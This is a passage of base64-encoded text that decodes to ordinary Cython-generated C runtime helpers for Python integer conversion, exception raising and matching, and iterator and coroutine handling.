PSAoKGludCkgaWRpZ2l0KSA8PCBiaXRzOwogICAgICAgICAgICB0bXAgPSBQeU51bWJlcl9Sc2hpZnQoc3RlcHZhbCwgc2hpZnQpOwogICAgICAgICAgICBpZiAodW5saWtlbHkoIXRtcCkpIGdvdG8gZG9uZTsKICAgICAgICAgICAgUHlfREVDUkVGKHN0ZXB2YWwpOyBzdGVwdmFsID0gdG1wOwogICAgICAgIH0KICAgICAgICBQeV9ERUNSRUYoc2hpZnQpOyBzaGlmdCA9IE5VTEw7CiAgICAgICAgUHlfREVDUkVGKG1hc2spOyBtYXNrID0gTlVMTDsKICAgICAgICB7CiAgICAgICAgICAgIGxvbmcgaWRpZ2l0ID0gUHlMb25nX0FzTG9uZyhzdGVwdmFsKTsKICAgICAgICAgICAgaWYgKHVubGlrZWx5KGlkaWdpdCA8IDApKSBnb3RvIGRvbmU7CiAgICAgICAgICAgIHJlbWFpbmluZ19iaXRzID0gKChpbnQpIHNpemVvZihpbnQpICogOCkgLSBiaXRzIC0gKGlzX3Vuc2lnbmVkID8gMCA6IDEpOwogICAgICAgICAgICBpZiAodW5saWtlbHkoaWRpZ2l0ID49ICgxTCA8PCByZW1haW5pbmdfYml0cykpKQogICAgICAgICAgICAgICAgZ290byByYWlzZV9vdmVyZmxvdzsKICAgICAgICAgICAgdmFsIHw9ICgoaW50KSBpZGlnaXQpIDw8IGJpdHM7CiAgICAgICAgfQogICAgICAgIGlmICghaXNfdW5zaWduZWQpIHsKICAgICAgICAgICAgaWYgKHVubGlrZWx5KHZhbCAmICgoKGludCkgMSkgPDwgKHNpemVvZihpbnQpICogOCAtIDEpKSkpCiAgICAgICAgICAgICAgICBnb3RvIHJhaXNlX292ZXJmbG93OwogICAgICAgICAgICBpZiAoaXNfbmVnYXRpdmUpCiAgICAgICAgICAgICAgICB2YWwgPSB+dmFsOwogICAgICAgIH0KICAgICAgICByZXQgPSAwOwogICAgZG9uZToKICAgICAgICBQeV9YREVDUkVGKHNoaWZ0KTsKICAgICAgICBQeV9YREVDUkVGKG1hc2spOwogICAgICAgIFB5X1hERUNSRUYoc3RlcHZhbCk7CiNlbmRpZgogICAgICAgIGlmICh1bmxpa2VseShyZXQpKQogICAgICAgICAgICByZXR1cm4gKGludCkgLTE7CiAgICAgICAgcmV0dXJuIHZhbDsKICAgIH0KcmFpc2Vfb3ZlcmZsb3c6CiAgICBQeUVycl9TZXRTdHJpbmcoUHlFeGNfT3ZlcmZsb3dFcnJvciwKICAgICAgICAidmFsdWUgdG9vIGxhcmdlIHRvIGNvbnZlcnQgdG8gaW50Iik7CiAgICByZXR1cm4gKGludCkgLTE7CnJhaXNlX25lZ19vdmVyZmxvdzoKICAgIFB5RXJyX1NldFN0cmluZyhQeUV4Y19PdmVyZmxvd0Vycm9yLAogICAgICAgICJjYW4ndCBjb252ZXJ0IG5lZ2F0aXZlIHZhbHVlIHRvIGludCIpOwogICAgcmV0dXJuIChpbnQpIC0xOwp9CgoKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTgpzdGF0aWMgaW50IF9fUHl4X0luQmFzZXMoUHlUeXBlT2JqZWN0ICphLCBQeVR5cGVPYmplY3QgKmIpIHsKICAgIHdoaWxlIChhKSB7CiAgICAgICAgYSA9IF9fUHl4X1B5VHlwZV9HZXRTbG90KGEsIHRwX2Jhc2UsIFB5VHlwZU9iamVjdCopOwogICAgICAgIGlmIChhID09IGIpCiAgICAgICAgICAgIHJldHVybiAxOwogICAgfQogICAgcmV0dXJuIGIgPT0gJlB5QmFzZU9iamVjdF9UeXBlOwp9CnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9Jc1N1YnR5cGUoUHlUeXBlT2JqZWN0ICphLCBQeVR5cGVPYmplY3QgKmIpIHsKICAgIFB5T2JqZWN0ICptcm87CiAgICBpZiAoYSA9PSBiKSByZXR1cm4gMTsKICAgIG1ybyA9IGEtPnRwX21ybzsKICAgIGlmIChsaWtlbHkobXJvKSkgewogICAgICAgIFB5X3NzaXplX3QgaSwgbjsKICAgICAgICBuID0gUHlUdXBsZV9HRVRfU0laRShtcm8pOwogICAgICAgIGZvciAoaSA9IDA7IGkgPCBuOyBpKyspIHsKICAgICAgICAgICAgaWYgKFB5VHVwbGVfR0VUX0lURU0obXJvLCBpKSA9PSAoUHlPYmplY3QgKiliKQogICAgICAgICAgICAgICAgcmV0dXJuIDE7CiAgICAgICAgfQogICAgICAgIHJldHVybiAwOwogICAgfQogICAgcmV0dXJuIF9fUHl4X0luQmFzZXMoYSwgYik7Cn0Kc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X0lzQW55U3VidHlwZTIoUHlUeXBlT2JqZWN0ICpjbHMsIFB5VHlwZU9iamVjdCAqYSwgUHlUeXBlT2JqZWN0ICpiKSB7CiAgICBQeU9iamVjdCAqbXJvOwogICAgaWYgKGNscyA9PSBhIHx8IGNscyA9PSBiKSByZXR1cm4gMTsKICAgIG1ybyA9IGNscy0+dHBfbXJvOwogICAgaWYgKGxpa2VseShtcm8pKSB7CiAgICAgICAgUHlfc3NpemVfdCBpLCBuOwogICAgICAgIG4gPSBQeVR1cGxlX0dFVF9TSVpFKG1ybyk7CiAgICAgICAgZm9yIChpID0gMDsgaSA8IG47IGkrKykgewogICAgICAgICAgICBQeU9iamVjdCAqYmFzZSA9IFB5VHVwbGVfR0VUX0lURU0obXJvLCBpKTsKICAgICAgICAgICAgaWYgKGJhc2UgPT0gKFB5T2JqZWN0ICopYSB8fCBiYXNlID09IChQeU9iamVjdCAqKWIpCiAgICAgICAgICAgICAgICByZXR1cm4gMTsKICAgICAgICB9CiAgICAgICAgcmV0dXJuIDA7CiAgICB9CiAgICByZXR1cm4gX19QeXhfSW5CYXNlcyhjbHMsIGEpIHx8IF9fUHl4X0luQmFzZXMoY2xzLCBiKTsKfQpzdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfaW5uZXJfUHlFcnJfR2l2ZW5FeGNlcHRpb25NYXRjaGVzMihQeU9iamVjdCAqZXJyLCBQeU9iamVjdCogZXhjX3R5cGUxLCBQeU9iamVjdCAqZXhjX3R5cGUyKSB7CiAgICBpZiAoZXhjX3R5cGUxKSB7CiAgICAgICAgcmV0dXJuIF9fUHl4X0lzQW55U3VidHlwZTIoKFB5VHlwZU9iamVjdCopZXJyLCAoUHlUeXBlT2JqZWN0KilleGNfdHlwZTEsIChQeVR5cGVPYmplY3QqKWV4Y190eXBlMik7CiAgICB9IGVsc2UgewogICAgICAgIHJldHVybiBfX1B5eF9Jc1N1YnR5cGUoKFB5VHlwZU9iamVjdCopZXJyLCAoUHlUeXBlT2JqZWN0KilleGNfdHlwZTIpOwogICAgfQp9CnN0YXRpYyBpbnQgX19QeXhfUHlFcnJfR2l2ZW5FeGNlcHRpb25NYXRjaGVzVHVwbGUoUHlPYmplY3QgKmV4Y190eXBlLCBQeU9iamVjdCAqdHVwbGUpIHsKICAgIFB5X3NzaXplX3QgaSwgbjsKICAgIGFzc2VydChQeUV4Y2VwdGlvbkNsYXNzX0NoZWNrKGV4Y190eXBlKSk7CiAgICBuID0gUHlUdXBsZV9HRVRfU0laRSh0dXBsZSk7CiAgICBmb3IgKGk9MDsgaTxuOyBpKyspIHsKICAgICAgICBpZiAoZXhjX3R5cGUgPT0gUHlUdXBsZV9HRVRfSVRFTSh0dXBsZSwgaSkpIHJldHVybiAxOwogICAgfQogICAgZm9yIChpPTA7IGk8bjsgaSsrKSB7CiAgICAgICAgUHlPYmplY3QgKnQgPSBQeVR1cGxlX0dFVF9JVEVNKHR1cGxlLCBpKTsKICAgICAgICBpZiAobGlrZWx5KFB5RXhjZXB0aW9uQ2xhc3NfQ2hlY2sodCkpKSB7CiAgICAgICAgICAgIGlmIChfX1B5eF9pbm5lcl9QeUVycl9HaXZlbkV4Y2VwdGlvbk1hdGNoZXMyKGV4Y190eXBlLCBOVUxMLCB0KSkgcmV0dXJuIDE7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICB9CiAgICB9CiAgICByZXR1cm4gMDsKfQpzdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfUHlFcnJfR2l2ZW5FeGNlcHRpb25NYXRjaGVzKFB5T2JqZWN0ICplcnIsIFB5T2JqZWN0KiBleGNfdHlwZSkgewogICAgaWYgKGxpa2VseShlcnIgPT0gZXhjX3R5cGUpKSByZXR1cm4gMTsKICAgIGlmIChsaWtlbHkoUHlFeGNlcHRpb25DbGFzc19DaGVjayhlcnIpKSkgewogICAgICAgIGlmIChsaWtlbHkoUHlFeGNlcHRpb25DbGFzc19DaGVjayhleGNfdHlwZSkpKSB7CiAgICAgICAgICAgIHJldHVybiBfX1B5eF9pbm5lcl9QeUVycl9HaXZlbkV4Y2VwdGlvbk1hdGNoZXMyKGVyciwgTlVMTCwgZXhjX3R5cGUpOwogICAgICAgIH0gZWxzZSBpZiAobGlrZWx5KFB5VHVwbGVfQ2hlY2soZXhjX3R5cGUpKSkgewogICAgICAgICAgICByZXR1cm4gX19QeXhfUHlFcnJfR2l2ZW5FeGNlcHRpb25NYXRjaGVzVHVwbGUoZXJyLCBleGNfdHlwZSk7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICB9CiAgICB9CiAgICByZXR1cm4gUHlFcnJfR2l2ZW5FeGNlcHRpb25NYXRjaGVzKGVyciwgZXhjX3R5cGUpOwp9CnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9QeUVycl9HaXZlbkV4Y2VwdGlvbk1hdGNoZXMyKFB5T2JqZWN0ICplcnIsIFB5T2JqZWN0ICpleGNfdHlwZTEsIFB5T2JqZWN0ICpleGNfdHlwZTIpIHsKICAgIGFzc2VydChQeUV4Y2VwdGlvbkNsYXNzX0NoZWNrKGV4Y190eXBlMSkpOwogICAgYXNzZXJ0KFB5RXhjZXB0aW9uQ2xhc3NfQ2hlY2soZXhjX3R5cGUyKSk7CiAgICBpZiAobGlrZWx5KGVyciA9PSBleGNfdHlwZTEgfHwgZXJyID09IGV4Y190eXBlMikpIHJldHVybiAxOwogICAgaWYgKGxpa2VseShQeUV4Y2VwdGlvbkNsYXNzX0NoZWNrKGVycikpKSB7CiAgICAgICAgcmV0dXJuIF9fUHl4X2lubmVyX1B5RXJyX0dpdmVuRXhjZXB0aW9uTWF0Y2hlczIoZXJyLCBleGNfdHlwZTEsIGV4Y190eXBlMik7CiAgICB9CiAgICByZXR1cm4gKFB5RXJyX0dpdmVuRXhjZXB0aW9uTWF0Y2hlcyhlcnIsIGV4Y190eXBlMSkgfHwgUHlFcnJfR2l2ZW5FeGNlcHRpb25NYXRjaGVzKGVyciwgZXhjX3R5cGUyKSk7Cn0KI2VuZGlmCgoKc3RhdGljIHZvaWQgX19QeXhfUmFpc2UoUHlPYmplY3QgKnR5cGUsIFB5T2JqZWN0ICp2YWx1ZSwgUHlPYmplY3QgKnRiLCBQeU9iamVjdCAqY2F1c2UpIHsKICAgIFB5T2JqZWN0KiBvd25lZF9pbnN0YW5jZSA9IE5VTEw7CiAgICBpZiAodGIgPT0gUHlfTm9uZSkgewogICAgICAgIHRiID0gMDsKICAgIH0gZWxzZSBpZiAodGIgJiYgIVB5VHJhY2VCYWNrX0NoZWNrKHRiKSkgewogICAgICAgIFB5RXJyX1NldFN0cmluZyhQeUV4Y19UeXBlRXJyb3IsCiAgICAgICAgICAgICJyYWlzZTogYXJnIDMgbXVzdCBiZSBhIHRyYWNlYmFjayBvciBOb25lIik7CiAgICAgICAgZ290byBiYWQ7CiAgICB9CiAgICBpZiAodmFsdWUgPT0gUHlfTm9uZSkKICAgICAgICB2YWx1ZSA9IDA7CiAgICBpZiAoUHlFeGNlcHRpb25JbnN0YW5jZV9DaGVjayh0eXBlKSkgewogICAgICAgIGlmICh2YWx1ZSkgewogICAgICAgICAgICBQeUVycl9TZXRTdHJpbmcoUHlFeGNfVHlwZUVycm9yLAogICAgICAgICAgICAgICAgImluc3RhbmNlIGV4Y2VwdGlvbiBtYXkgbm90IGhhdmUgYSBzZXBhcmF0ZSB2YWx1ZSIpOwogICAgICAgICAgICBnb3RvIGJhZDsKICAgICAgICB9CiAgICAgICAgdmFsdWUgPSB0eXBlOwogICAgICAgIHR5cGUgPSAoUHlPYmplY3QqKSBQeV9UWVBFKHZhbHVlKTsKICAgIH0gZWxzZSBpZiAoUHlFeGNlcHRpb25DbGFzc19DaGVjayh0eXBlKSkgewogICAgICAgIFB5T2JqZWN0ICppbnN0YW5jZV9jbGFzcyA9IE5VTEw7CiAgICAgICAgaWYgKHZhbHVlICYmIFB5RXhjZXB0aW9uSW5zdGFuY2VfQ2hlY2sodmFsdWUpKSB7CiAgICAgICAgICAgIGluc3RhbmNlX2NsYXNzID0gKFB5T2JqZWN0KikgUHlfVFlQRSh2YWx1ZSk7CiAgICAgICAgICAgIGlmIChpbnN0YW5jZV9jbGFzcyAhPSB0eXBlKSB7CiAgICAgICAgICAgICAgICBpbnQgaXNfc3ViY2xhc3MgPSBQeU9iamVjdF9Jc1N1YmNsYXNzKGluc3RhbmNlX2NsYXNzLCB0eXBlKTsKICAgICAgICAgICAgICAgIGlmICghaXNfc3ViY2xhc3MpIHsKICAgICAgICAgICAgICAgICAgICBpbnN0YW5jZV9jbGFzcyA9IE5VTEw7CiAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKHVubGlrZWx5KGlzX3N1YmNsYXNzID09IC0xKSkgewogICAgICAgICAgICAgICAgICAgIGdvdG8gYmFkOwogICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICB0eXBlID0gaW5zdGFuY2VfY2xhc3M7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgaWYgKCFpbnN0YW5jZV9jbGFzcykgewogICAgICAgICAgICBQeU9iamVjdCAqYXJnczsKICAgICAgICAgICAgaWYgKCF2YWx1ZSkKICAgICAgICAgICAgICAgIGFyZ3MgPSBQeVR1cGxlX05ldygwKTsKICAgICAgICAgICAgZWxzZSBpZiAoUHlUdXBsZV9DaGVjayh2YWx1ZSkpIHsKICAgICAgICAgICAgICAgIFB5X0lOQ1JFRih2YWx1ZSk7CiAgICAgICAgICAgICAgICBhcmdzID0gdmFsdWU7CiAgICAgICAgICAgIH0gZWxzZQogICAgICAgICAgICAgICAgYXJncyA9IFB5VHVwbGVfUGFjaygxLCB2YWx1ZSk7CiAgICAgICAgICAgIGlmICghYXJncykKICAgICAgICAgICAgICAgIGdvdG8gYmFkOwogICAgICAgICAgICBvd25lZF9pbnN0YW5jZSA9IFB5T2JqZWN0X0NhbGwodHlwZSwgYXJncywgTlVMTCk7CiAgICAgICAgICAgIFB5X0RFQ1JFRihhcmdzKTsKICAgICAgICAgICAgaWYgKCFvd25lZF9pbnN0YW5jZSkKICAgICAgICAgICAgICAgIGdvdG8gYmFkOwogICAgICAgICAgICB2YWx1ZSA9IG93bmVkX2luc3RhbmNlOwogICAgICAgICAgICBpZiAoIVB5RXhjZXB0aW9uSW5zdGFuY2VfQ2hlY2sodmFsdWUpKSB7CiAgICAgICAgICAgICAgICBQeUVycl9Gb3JtYXQoUHlFeGNfVHlwZUVycm9yLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICJjYWxsaW5nICVSIHNob3VsZCBoYXZlIHJldHVybmVkIGFuIGluc3RhbmNlIG9mICIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiQmFzZUV4Y2VwdGlvbiwgbm90ICVSIiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0eXBlLCBQeV9UWVBFKHZhbHVlKSk7CiAgICAgICAgICAgICAgICBnb3RvIGJhZDsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0gZWxzZSB7CiAgICAgICAgUHlFcnJfU2V0U3RyaW5nKFB5RXhjX1R5cGVFcnJvciwKICAgICAgICAgICAgInJhaXNlOiBleGNlcHRpb24gY2xhc3MgbXVzdCBiZSBhIHN1YmNsYXNzIG9mIEJhc2VFeGNlcHRpb24iKTsKICAgICAgICBnb3RvIGJhZDsKICAgIH0KICAgIGlmIChjYXVzZSkgewogICAgICAgIFB5T2JqZWN0ICpmaXhlZF9jYXVzZTsKICAgICAgICBpZiAoY2F1c2UgPT0gUHlfTm9uZSkgewogICAgICAgICAgICBmaXhlZF9jYXVzZSA9IE5VTEw7CiAgICAgICAgfSBlbHNlIGlmIChQeUV4Y2VwdGlvbkNsYXNzX0NoZWNrKGNhdXNlKSkgewogICAgICAgICAgICBmaXhlZF9jYXVzZSA9IFB5T2JqZWN0X0NhbGxPYmplY3QoY2F1c2UsIE5VTEwpOwogICAgICAgICAgICBpZiAoZml4ZWRfY2F1c2UgPT0gTlVMTCkKICAgICAgICAgICAgICAgIGdvdG8gYmFkOwogICAgICAgIH0gZWxzZSBpZiAoUHlFeGNlcHRpb25JbnN0YW5jZV9DaGVjayhjYXVzZSkpIHsKICAgICAgICAgICAgZml4ZWRfY2F1c2UgPSBjYXVzZTsKICAgICAgICAgICAgUHlfSU5DUkVGKGZpeGVkX2NhdXNlKTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBQeUVycl9TZXRTdHJpbmcoUHlFeGNfVHlwZUVycm9yLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgImV4Y2VwdGlvbiBjYXVzZXMgbXVzdCBkZXJpdmUgZnJvbSAiCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAiQmFzZUV4Y2VwdGlvbiIpOwogICAgICAgICAgICBnb3RvIGJhZDsKICAgICAgICB9CiAgICAgICAgUHlFeGNlcHRpb25fU2V0Q2F1c2UodmFsdWUsIGZpeGVkX2NhdXNlKTsKICAgIH0KICAgIFB5RXJyX1NldE9iamVjdCh0eXBlLCB2YWx1ZSk7CiAgICBpZiAodGIpIHsKI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwQzAwQTYKICAgICAgICBQeUV4Y2VwdGlvbl9TZXRUcmFjZWJhY2sodmFsdWUsIHRiKTsKI2VsaWYgQ1lUSE9OX0ZBU1RfVEhSRUFEX1NUQVRFCiAgICAgICAgUHlUaHJlYWRTdGF0ZSAqdHN0YXRlID0gX19QeXhfUHlUaHJlYWRTdGF0ZV9DdXJyZW50OwogICAgICAgIFB5T2JqZWN0KiB0bXBfdGIgPSB0c3RhdGUtPmN1cmV4Y190cmFjZWJhY2s7CiAgICAgICAgaWYgKHRiICE9IHRtcF90YikgewogICAgICAgICAgICBQeV9JTkNSRUYodGIpOwogICAgICAgICAgICB0c3RhdGUtPmN1cmV4Y190cmFjZWJhY2sgPSB0YjsKICAgICAgICAgICAgUHlfWERFQ1JFRih0bXBfdGIpOwogICAgICAgIH0KI2Vsc2UKICAgICAgICBQeU9iamVjdCAqdG1wX3R5cGUsICp0bXBfdmFsdWUsICp0bXBfdGI7CiAgICAgICAgUHlFcnJfRmV0Y2goJnRtcF90eXBlLCAmdG1wX3ZhbHVlLCAmdG1wX3RiKTsKICAgICAgICBQeV9JTkNSRUYodGIpOwogICAgICAgIFB5RXJyX1Jlc3RvcmUodG1wX3R5cGUsIHRtcF92YWx1ZSwgdGIpOwogICAgICAgIFB5X1hERUNSRUYodG1wX3RiKTsKI2VuZGlmCiAgICB9CmJhZDoKICAgIFB5X1hERUNSRUYob3duZWRfaW5zdGFuY2UpOwogICAgcmV0dXJuOwp9CgoKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkgJiYgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA8IDB4MDMwQTAwMDAKc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9HZXRCdWlsdGluTmV4dF9MaW1pdGVkQVBJKHZvaWQpIHsKICAgIGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlX2dsb2JhbC0+X19QeXhfR2V0QnVpbHRpbk5leHRfTGltaXRlZEFQSV9jYWNoZSkpCiAgICAgICAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19QeXhfR2V0QnVpbHRpbk5leHRfTGltaXRlZEFQSV9jYWNoZSA9IF9fUHl4X0dldEJ1aWx0aW5OYW1lKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9uZXh0KTsKICAgIHJldHVybiBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX1B5eF9HZXRCdWlsdGluTmV4dF9MaW1pdGVkQVBJX2NhY2hlOwp9CiNlbmRpZgpzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCAqX19QeXhfUHlJdGVyX05leHRfUGxhaW4oUHlPYmplY3QgKml0ZXJhdG9yKSB7CiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJICYmIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPCAweDAzMEEwMDAwCiAgICBQeU9iamVjdCAqcmVzdWx0OwogICAgUHlPYmplY3QgKm5leHQgPSBfX1B5eF9HZXRCdWlsdGluTmV4dF9MaW1pdGVkQVBJKCk7CiAgICBpZiAodW5saWtlbHkoIW5leHQpKSByZXR1cm4gTlVMTDsKICAgIHJlc3VsdCA9IFB5T2JqZWN0X0NhbGxGdW5jdGlvbk9iakFyZ3MobmV4dCwgaXRlcmF0b3IsIE5VTEwpOwogICAgcmV0dXJuIHJlc3VsdDsKI2Vsc2UKICAgICh2b2lkKV9fUHl4X0dldEJ1aWx0aW5OYW1lOyAvLyBvbmx5IGZvciBlYXJseSBsaW1pdGVkIEFQSQogICAgaXRlcm5leHRmdW5jIGl0ZXJuZXh0ID0gX19QeXhfUHlPYmplY3RfR2V0SXRlck5leHRGdW5jKGl0ZXJhdG9yKTsKICAgIGFzc2VydChpdGVybmV4dCk7CiAgICByZXR1cm4gaXRlcm5leHQoaXRlcmF0b3IpOwojZW5kaWYKfQoKCnN0YXRpYyB2b2lkIF9fUHl4X19SZXR1cm5XaXRoU3RvcEl0ZXJhdGlvbihQeU9iamVjdCogdmFsdWUsIGludCBhc3luYyk7CnN0YXRpYyBDWVRIT05fSU5MSU5FIHZvaWQgX19QeXhfUmV0dXJuV2l0aFN0b3BJdGVyYXRpb24oUHlPYmplY3QqIHZhbHVlLCBpbnQgYXN5bmMsIGludCBpdGVybmV4dCkgewogICAgaWYgKHZhbHVlID09IFB5X05vbmUpIHsKICAgICAgICBpZiAoYXN5bmMgfHwgIWl0ZXJuZXh0KQogICAgICAgICAgICBQeUVycl9TZXROb25lKGFzeW5jID8gUHlFeGNfU3RvcEFzeW5jSXRlcmF0aW9uIDogUHlFeGNfU3RvcEl0ZXJhdGlvbik7CiAgICAgICAgcmV0dXJuOwogICAgfQogICAgX19QeXhfX1JldHVybldpdGhTdG9wSXRlcmF0aW9uKHZhbHVlLCBhc3luYyk7Cn0Kc3RhdGljIHZvaWQgX19QeXhfX1JldHVybldpdGhTdG9wSXRlcmF0aW9uKFB5T2JqZWN0KiB2YWx1ZSwgaW50IGFzeW5jKSB7CiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04KICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfZGVjbGFyZQojZW5kaWYKICAgIFB5T2JqZWN0ICpleGM7CiAgICBQeU9iamVjdCAqZXhjX3R5cGUgPSBhc3luYyA/IFB5RXhjX1N0b3BBc3luY0l0ZXJhdGlvbiA6IFB5RXhjX1N0b3BJdGVyYXRpb247CiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04KICAgIGlmICgoUFlfVkVSU0lPTl9IRVggPj0gKDB4MDMwQzAwQTYpKSB8fCB1bmxpa2VseShQeVR1cGxlX0NoZWNrKHZhbHVlKSB8fCBQeUV4Y2VwdGlvbkluc3RhbmNlX0NoZWNrKHZhbHVlKSkpIHsKICAgICAgICBpZiAoUFlfVkVSU0lPTl9IRVggPj0gKDB4MDMwZTAwQTEpKSB7CiAgICAgICAgICAgIGV4YyA9IF9fUHl4X1B5T2JqZWN0X0NhbGxPbmVBcmcoZXhjX3R5cGUsIHZhbHVlKTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBQeU9iamVjdCAqYXJnc190dXBsZSA9IFB5VHVwbGVfTmV3KDEpOwogICAgICAgICAgICBpZiAodW5saWtlbHkoIWFyZ3NfdHVwbGUpKSByZXR1cm47CiAgICAgICAgICAgIFB5X0lOQ1JFRih2YWx1ZSk7CiAgICAgICAgICAgIFB5VHVwbGVfU0VUX0lURU0oYXJnc190dXBsZSwgMCwgdmFsdWUpOwogICAgICAgICAgICBleGMgPSBQeU9iamVjdF9DYWxsKGV4Y190eXBlLCBhcmdzX3R1cGxlLCBOVUxMKTsKICAgICAgICAgICAgUHlfREVDUkVGKGFyZ3NfdHVwbGUpOwogICAgICAgIH0KICAgICAgICBpZiAodW5saWtlbHkoIWV4YykpIHJldHVybjsKICAgIH0gZWxzZSB7CiAgICAgICAgUHlfSU5DUkVGKHZhbHVlKTsKICAgICAgICBleGMgPSB2YWx1ZTsKICAgIH0KICAgICNpZiBDWVRIT05fRkFTVF9USFJFQURfU1RBVEUKICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfYXNzaWduCiAgICAjaWYgQ1lUSE9OX1VTRV9FWENfSU5GT19TVEFDSwogICAgaWYgKCFfX3B5eF90c3RhdGUtPmV4Y19pbmZvLT5leGNfdmFsdWUpCiAgICAjZWxzZQogICAgaWYgKCFfX3B5eF90c3RhdGUtPmV4Y190eXBlKQogICAgI2VuZGlmCiAgICB7CiAgICAgICAgUHlfSU5DUkVGKGV4Y190eXBlKTsKICAgICAgICBfX1B5eF9FcnJSZXN0b3JlKGV4Y190eXBlLCBleGMsIE5VTEwpOwogICAgICAgIHJldHVybjsKICAgIH0KICAgICNlbmRpZgojZWxzZQogICAgZXhjID0gX19QeXhfUHlPYmplY3RfQ2FsbE9uZUFyZyhleGNfdHlwZSwgdmFsdWUpOwogICAgaWYgKHVubGlrZWx5KCFleGMpKSByZXR1cm47CiNlbmRpZgogICAgUHlFcnJfU2V0T2JqZWN0KGV4Y190eXBlLCBleGMpOwogICAgUHlfREVDUkVGKGV4Yyk7Cn0KCgojaWYgIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKI2luY2x1ZGUgPGZyYW1lb2JqZWN0Lmg+CiNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMGIwMGE2ICYmICFkZWZpbmVkKFBZUFlfVkVSU0lPTikKICAjaWZuZGVmIFB5X0JVSUxEX0NPUkUKICAgICNkZWZpbmUgUHlfQlVJTERfQ09SRSAxCiAgI2VuZGlmCiAgI2luY2x1ZGUgImludGVybmFsL3B5Y29yZV9mcmFtZS5oIgojZW5kaWYKI2VuZGlmIC8vIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKc3RhdGljIENZVEhPTl9JTkxJTkUgdm9pZApfX1B5eF9Db3JvdXRpbmVfVW5kZWxlZ2F0ZShfX3B5eF9Db3JvdXRpbmVPYmplY3QgKmdlbikgewojaWYgQ1lUSE9OX1VTRV9BTV9TRU5ECiAgICBnZW4tPnlpZWxkZnJvbV9hbV9zZW5kID0gTlVMTDsKI2VuZGlmCiAgICBQeV9DTEVBUihnZW4tPnlpZWxkZnJvbSk7Cn0Kc3RhdGljIGludCBfX1B5eF9QeUdlbl9fRmV0Y2hTdG9wSXRlcmF0aW9uVmFsdWUoUHlUaHJlYWRTdGF0ZSAqX19weXhfdHN0YXRlLCBQeU9iamVjdCAqKnB2YWx1ZSkgewogICAgUHlPYmplY3QgKmV0LCAqZXYsICp0YjsKICAgIFB5T2JqZWN0ICp2YWx1ZSA9IE5VTEw7CiAgICBDWVRIT05fVU5VU0VEX1ZBUihfX3B5eF90c3RhdGUpOwogICAgX19QeXhfRXJyRmV0Y2goJmV0LCAmZXYsICZ0Yik7CiAgICBpZiAoIWV0KSB7CiAgICAgICAgUHlfWERFQ1JFRih0Yik7CiAgICAgICAgUHlfWERFQ1JFRihldik7CiAgICAgICAgUHlfSU5DUkVGKFB5X05vbmUpOwogICAgICAgICpwdmFsdWUgPSBQeV9Ob25lOwogICAgICAgIHJldHVybiAwOwogICAgfQogICAgaWYgKGxpa2VseShldCA9PSBQeUV4Y19TdG9wSXRlcmF0aW9uKSkgewogICAgICAgIGlmICghZXYpIHsKICAgICAgICAgICAgUHlfSU5DUkVGKFB5X05vbmUpOwogICAgICAgICAgICB2YWx1ZSA9IFB5X05vbmU7CiAgICAgICAgfQogICAgICAgIGVsc2UgaWYgKGxpa2VseShfX1B5eF9JU19UWVBFKGV2LCAoUHlUeXBlT2JqZWN0KilQeUV4Y19TdG9wSXRlcmF0aW9uKSkpIHsKICAgICAgICAgICAgI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkgfHwgQ1lUSE9OX0NPTVBJTElOR19JTl9HUkFBTAogICAgICAgICAgICB2YWx1ZSA9IFB5T2JqZWN0X0dldEF0dHIoZXYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV92YWx1ZSk7CiAgICAgICAgICAgIGlmICh1bmxpa2VseSghdmFsdWUpKSBnb3RvIGxpbWl0ZWRfYXBpX2ZhaWx1cmU7CiAgICAgICAgICAgICNlbHNlCiAgICAgICAgICAgIHZhbHVlID0gKChQeVN0b3BJdGVyYXRpb25PYmplY3QgKilldiktPnZhbHVlOwogICAgICAgICAgICBQeV9JTkNSRUYodmFsdWUpOwogICAgICAgICAgICAjZW5kaWYKICAgICAgICAgICAgUHlfREVDUkVGKGV2KTsKICAgICAgICB9CiAgICAgICAgZWxzZSBpZiAodW5saWtlbHkoUHlUdXBsZV9DaGVjayhldikpKSB7CiAg